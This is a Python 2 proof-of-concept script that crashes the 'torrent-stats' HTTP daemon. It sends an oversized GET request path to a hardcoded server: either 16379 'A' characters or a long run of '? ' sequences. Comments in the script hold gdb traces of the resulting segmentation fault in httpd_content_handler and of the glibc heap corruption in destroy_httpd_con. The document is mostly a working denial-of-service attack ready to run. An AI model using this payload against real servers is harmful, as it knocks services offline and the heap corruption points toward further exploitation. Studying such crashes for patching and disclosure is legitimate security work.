#!/usr/bin/python
import socket, urllib, sys
host = '147.2.215.103'
port = 80
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.settimeout(8)

print 'Sending GET request'

# size = sys.argv[1]
# Crash at A * 16378
size = 16379

# DOS #1: gdb trace for buffer1
#Program received signal SIGSEGV, Segmentation fault.
#--------------------------------------------------------------------------[regs]
#  EAX: 0x00000000  EBX: 0x08051258  ECX: 0x00000000  EDX: 0x20202020  o d I t s Z a P c 
#  ESI: 0x080537BC  EDI: 0x080537B8  EBP: 0xBFFFF2E8  ESP: 0xBFFFF2B0  EIP: 0x0804AF72
#  CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
#--------------------------------------------------------------------------[code]
#=> 0x804af72 <httpd_content_handler+306>:	movb   $0x0,(%eax)
#   0x804af75 <httpd_content_handler+309>:	mov    0x20(%ebx),%edx
#   0x804af78 <httpd_content_handler+312>:	add    $0x1,%eax
#   0x804af7b <httpd_content_handler+315>:	mov    %eax,(%edx)
#   0x804af7d <httpd_content_handler+317>:	mov    -0x1c(%ebp),%eax
#   0x804af80 <httpd_content_handler+320>:	movzbl 0x1(%eax),%edx
#   0x804af84 <httpd_content_handler+324>:	test   %dl,%dl
#   0x804af86 <httpd_content_handler+326>:	je     0x804b12e <httpd_content_handler+750>
#--------------------------------------------------------------------------------
#parse_args (fd=0x9, privdata=0x8051258) at httpd.c:106
#106		*tmp++ = '\0';
buffer1 = "/" + "A" * int(size)

# DOS #2 : gdb trace for the buffer2
# *** glibc detected *** /root/torrent-stats/torrent-stats: munmap_chunk(): invalid pointer: 0x080537b8 ***
# *** glibc detected *** /root/torrent-stats/torrent-stats: malloc(): memory corruption: 0x080512c8 ***
#gdb$ backtrace
#0  0xb7fe2430 in __kernel_vsyscall ()
#1  0xb7e9b651 in raise () from /lib/tls/i686/cmov/libc.so.6
#2  0xb7e9ea82 in abort () from /lib/tls/i686/cmov/libc.so.6
#3  0xb7ed249d in ?? () from /lib/tls/i686/cmov/libc.so.6
#4  0xb7edc591 in ?? () from /lib/tls/i686/cmov/libc.so.6
#5  0xb7edf395 in ?? () from /lib/tls/i686/cmov/libc.so.6
#6  0xb7ee0f9c in malloc () from /lib/tls/i686/cmov/libc.so.6
#7  0xb7ed2437 in ?? () from /lib/tls/i686/cmov/libc.so.6
#8  0xb7edc591 in ?? () from /lib/tls/i686/cmov/libc.so.6
#9  0xb7edd80e in ?? () from /lib/tls/i686/cmov/libc.so.6
#10 0x0804ad26 in destroy_httpd_con (con=0xb7fc6ff4) at httpd.c:43
#11 0x0804b0df in httpd_content_handler (fd=0x9, privdata=0x8051258) at httpd.c:193
#12 0x0804a7a0 in event_loop () at event.c:303
#13 0x0804d237 in main (argc=0x2, argv=0xbffff474) at torrent-stats.c:124
buffer2 = "/" + "? " * int(size) + "?"

buffer = buffer2
s.send('GET ' + buffer + ' HTTP/1.1\r\nHost: ' + host + '\r\n\r\n')
print s.recv(8192) + s.recv(8192)

